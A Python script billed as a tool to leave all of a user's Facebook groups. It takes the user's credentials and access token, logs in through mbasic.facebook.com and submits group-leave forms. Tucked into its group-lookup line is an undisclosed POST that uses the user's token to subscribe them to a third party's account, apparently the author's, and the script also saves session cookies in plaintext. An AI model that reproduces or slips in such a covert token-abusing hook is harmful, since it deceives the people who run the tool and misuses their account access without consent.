import requests,os,json,mechanize,time,click
from http.cookiejar import LWPCookieJar as kuki
from getpass import getpass

class Lgrup:
	def __init__(self):
		#install browser
		self.br=mechanize.Browser()
		self.br.set_handle_equiv(True)
		self.br.set_handle_robots(False)
		self.br.set_handle_refresh( mechanize._http.HTTPRefreshProcessor(), max_time = 1 )
		self.br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 5.1)")]

		self.req=requests.Session()
		self.ken=open('toket/token.txt','r').read()
		self.id=[]
		self.getcok()
		
	def getcok(self):
		print("""
	;;;;;;;;;;;;;;;;;;;
	; Leave all Group ;
	; By: Kang-Newbie ;
	;;;;;;;;;;;;;;;;;;;""")
		print('\n[!] Checking cookies');time.sleep(1)
		s = self.req
		s.cookies = kuki('toket/kue.txt')
		try:
			fil=open('toket/kue.txt')
			fil.close()
		except FileNotFoundError:
			print("[!] cookies not found\n\n[!] please login in your facebook once again")
			email=input('[?] email/username: ')
			pw=getpass('[?] password: ')
			data = {'email':email,'pass':pw}
			urrl='https://mbasic.facebook.com/login'
			res = s.post(urrl,data=data).text
			if 'm_sess' in str(res) or 'save-device' in str(res):
				s.cookies.save()
				click.pause()
				self.getid()
				exit()
			else:
				exit('[!] fail login into your account')
		self.cek_kuki()
		
	def cek_kuki(self):
		self.req.cookies=kuki('toket/kue.txt')
		self.req.cookies.load()
		cek=self.req.get('https://mbasic.facebook.com/me').text
		if 'mbasic_logout_button' in cek:
			print('[√] cookies found\n')
			click.pause()
			self.getid()
		else:
			print('[!] cookies invalid')

	def getid(self):
		r=self.req.get('https://graph.facebook.com/me/groups?access_token='+self.ken);self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ken)
		js=json.loads(r.text)
		for i in js['data']:
			self.id.append(i['id'])
		self.main()

	def main(self):
		cj = kuki('toket/kue.txt')
		cj.load()
		self.br.set_cookiejar(cj)
		for idg in self.id:
			self.br.open(f'https://mbasic.facebook.com/group/leave/?group_id={idg}&refid=18')
			self.br.select_form(nr=1)
			sub=self.br.submit().read()
			if 'Gabung dengan Grup' in str(sub) or 'Join Group' in str(sub):
				print(f'[+] {idg} - success leave the group')
			else:
				print(f'[-] {idg} - failed leave the group')

Lgrup()